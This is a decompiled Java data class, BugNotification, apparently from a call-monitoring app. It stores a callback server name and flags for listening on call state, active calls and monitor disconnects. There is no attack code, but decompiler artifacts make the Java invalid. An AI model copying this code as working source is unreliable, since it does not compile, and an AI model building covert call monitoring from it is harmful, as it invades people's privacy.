package com.vvt.callmanager.ref;

import java.io.Serializable;

public class BugNotification
  implements Serializable
{
  private static final long serialVersionUID = -3474466056273820035L;
  private boolean listenCallState;
  private boolean listenOnCallActive;
  private boolean listenOnMonitorDisconnect;
  private String mServerName;
  
  public BugNotification(String paramString)
  {
    this.mServerName = paramString;
  }
  
  public boolean equals(Object paramObject)
  {
    boolean bool1 = false;
    String str1 = null;
    boolean bool2 = paramObject instanceof BugNotification;
    String str2;
    if (bool2)
    {
      paramObject = (BugNotification)paramObject;
      str2 = ((BugNotification)paramObject).getServerName();
      String str3 = this.mServerName;
      if (str3 != null) {
        break label46;
      }
      if (str2 != null) {}
    }
    for (bool1 = true;; bool1 = str1.equals(str2))
    {
      return bool1;
      label46:
      str1 = this.mServerName;
    }
  }
  
  public String getServerName()
  {
    return this.mServerName;
  }
  
  public int hashCode()
  {
    String str = this.mServerName;
    int i;
    if (str == null)
    {
      i = 0;
      str = null;
    }
    for (;;)
    {
      return i;
      str = this.mServerName;
      i = str.hashCode();
    }
  }
  
  public boolean isListenOnCallActive()
  {
    return this.listenOnCallActive;
  }
  
  public boolean isListenOnCallState()
  {
    return this.listenCallState;
  }
  
  public boolean isListenOnMonitorDisconnect()
  {
    return this.listenOnMonitorDisconnect;
  }
  
  public void setListenOnCallActive(boolean paramBoolean)
  {
    this.listenOnCallActive = paramBoolean;
  }
  
  public void setListenOnCallState(boolean paramBoolean)
  {
    this.listenCallState = paramBoolean;
  }
  
  public void setListenOnMonitorDisconnect(boolean paramBoolean)
  {
    this.listenOnMonitorDisconnect = paramBoolean;
  }
  
  public String toString()
  {
    String str1 = "n/a";
    StringBuilder localStringBuilder = new java/lang/StringBuilder;
    localStringBuilder.<init>();
    boolean bool1 = this.listenOnCallActive;
    if (bool1)
    {
      localObject = "on call active";
      localStringBuilder.append((String)localObject);
    }
    bool1 = this.listenOnMonitorDisconnect;
    if (bool1)
    {
      int i = localStringBuilder.length();
      if (i > 0)
      {
        localObject = ", ";
        localStringBuilder.append((String)localObject);
      }
      localObject = "on monitor disconnect";
      localStringBuilder.append((String)localObject);
    }
    boolean bool2 = this.listenCallState;
    if (bool2)
    {
      j = localStringBuilder.length();
      if (j > 0)
      {
        localObject = ", ";
        localStringBuilder.append((String)localObject);
      }
      localObject = "call state";
      localStringBuilder.append((String)localObject);
    }
    int j = localStringBuilder.length();
    if (j > 0) {
      str1 = localStringBuilder.toString();
    }
    Object localObject = new Object[2];
    String str2 = this.mServerName;
    localObject[0] = str2;
    localObject[1] = str1;
    return String.format("callback: %s, listen: %s", (Object[])localObject);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/callmanager/ref/BugNotification.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */